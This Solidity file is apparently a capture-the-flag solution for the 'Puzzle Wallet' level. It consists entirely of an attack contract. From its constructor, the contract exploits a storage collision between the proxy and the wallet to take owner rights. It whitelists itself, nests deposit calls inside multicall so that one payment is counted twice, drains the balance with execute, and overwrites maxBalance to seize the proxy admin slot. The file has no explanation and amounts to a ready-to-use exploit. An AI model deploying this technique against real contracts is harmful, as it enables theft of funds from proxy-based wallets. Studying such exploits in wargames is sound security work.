// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import { PuzzleWallet,PuzzleProxy } from "./PuzzleWallet.sol";

contract PuzzleWalletAttack{
    PuzzleWallet victim;
    PuzzleProxy proxy;

    constructor(address _v) payable {
        victim = PuzzleWallet(payable(_v));
        proxy = PuzzleProxy(payable(_v));
        proxy.proposeNewAdmin(address(this));
        victim.addToWhitelist(address(this));
        bytes[] memory deposit_data = new bytes[](1);
        deposit_data[0] = abi.encodeWithSelector(victim.deposit.selector);

        bytes[] memory data = new bytes[](2);
        data[0] = deposit_data[0];
        data[1] = abi.encodeWithSelector(victim.multicall.selector, deposit_data);
        victim.multicall{value: 0.001 ether}(data);

        victim.execute(msg.sender, 0.002 ether, "");
        victim.setMaxBalance(uint256(uint160(msg.sender)));
    }

}